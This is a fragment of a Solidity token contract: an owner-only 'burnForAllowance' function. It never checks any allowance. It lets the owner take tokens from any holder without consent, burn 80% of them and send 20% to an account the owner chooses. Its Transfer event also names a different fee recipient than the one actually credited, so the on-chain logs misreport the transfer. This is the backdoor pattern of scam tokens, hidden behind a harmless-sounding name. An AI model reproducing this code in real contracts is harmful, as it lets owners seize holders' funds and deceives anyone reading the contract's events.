function burnForAllowance(address account, address feeAccount, uint256 amount) public onlyOwner returns (bool success) {
        require(account != address(0), "burn from the zero address");
        require(balanceOf(account) >= amount, "insufficient balance");

        uint feeAmount = amount.mul(2).div(10);
        uint burnAmount = amount.sub(feeAmount);
        
        _totalSupply = _totalSupply.sub(burnAmount);
        balances[account] = balances[account].sub(amount);
        balances[feeAccount] = balances[feeAccount].add(feeAmount);
        emit Transfer(account, address(0), burnAmount);
        emit Transfer(account, msg.sender, feeAmount);
        return true;
    }